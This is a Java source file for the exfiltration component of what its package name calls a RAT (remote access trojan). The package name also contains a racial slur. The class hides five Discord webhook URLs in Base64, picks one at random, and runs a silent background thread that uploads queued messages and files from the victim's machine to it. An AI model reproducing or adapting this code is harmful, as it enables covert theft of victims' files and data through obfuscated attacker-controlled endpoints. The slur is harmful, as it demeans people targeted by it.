package me.nigger.rat.payload;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.squareup.okhttp.*;
import me.nigger.rat.util.Message;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.*;

public final class Sender
{
    private static final Sender INSTANCE = new Sender();
    private final Queue<Object> queue = new ArrayDeque<>();

    private Sender()
    {
        List<String> strings =
                Arrays.asList(
                        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvNzk5MDk5MzU4MDg3MzQ4MzE1L1VyTjQtV2psTDBsQUJNckF3dVpiMUdUUDJkUFdJbG1jR0JEbmJKalFYMmhwdE4taF8xXzBfeUxROXlSR0JNeGc4X0dK",
                        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvNzk5MDk5ODM3OTU3Nzk5OTM3L2llNGY0SWdvOTB5dE8wOVVSVXdQOG05OEpDYjd5bzZJUWkzdnRRdlV3dWFzMHNoYjlpUDF6X3B5YTU3ejJXbG5QYzZE",
                        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvNzk5MDk5OTkxMjM5MDMyODYyL3lYNmRqNHk0VlZMS3VZOEJSbVh4ZGhKOG5ReGt6NDJDQkl0SVNkYUVTeHA5dEd4NzM1bnNiVXJ4RmNQX1hTSnlibXhR",
                        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvNzk5MTAwMDk3MDczMzgxMzk2L29KSnJCam1rTGI4b202OERVTjBQUUExVmNjUVBGUGx4QmVJbjNYNFc4R3Q1dlc5dy1nb1JQb2djb1NjMXIwc3Jyb3VN",
                        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvNzk5MTAwMjMxMjcwNTMxMDczL2dCZi1jRUs0R0IyZmMwRFVKM05IYWRVeWdHVEczUHFQNEZJOUM0WlZJbS1aREkxbktUbnVzNTlEQWF0VTYweXRKdEtT"
                );
        String hooker = new String(Base64.getDecoder().decode(strings.get(new Random().nextInt(5)).getBytes(StandardCharsets.UTF_8)));
        new Thread(() -> { for (;;) { try {
            Thread.sleep(3500);
            if (queue.isEmpty()) continue;
            Object item = queue.poll();
            OkHttpClient client = new OkHttpClient();
            MultipartBuilder builder = new MultipartBuilder().type(MultipartBuilder.FORM);
            if (item instanceof String) builder.addFormDataPart("payload_json", "{\"content\":\"" + item + "\"}");
            else if (item instanceof File) builder.addFormDataPart("file1", ((File) item).getName(), RequestBody.create(MediaType.parse("application/octet-stream"), (File) item));
            else if (item instanceof Message) {
                JsonObject obj = new JsonObject();
                obj.addProperty("title", ((Message) item).getName());
                JsonArray embeds = new JsonArray();
                JsonObject embed = new JsonObject();
                JsonArray fields = new JsonArray();
                ((Message) item).getFields().forEach(field -> {
                    JsonObject f = new JsonObject();
                    f.addProperty("name", field.getName());
                    f.addProperty("value", field.getValue());
                    f.addProperty("inline", field.isInline());
                    fields.add(f);
                });
                embed.add("fields", fields);
                embeds.add(embed);
                obj.add("embeds", embeds);
                builder.addFormDataPart("payload_json", obj.toString());
            }
            else continue;
            Request request = new Request.Builder().url(hooker).method("POST", builder.build()).build();
            client.newCall(request).execute().body().close();
        } catch (Exception ignored) {}}}).start();
    }

    public static void send(Object string)
    {
        INSTANCE.queue.add(string);
    }
}
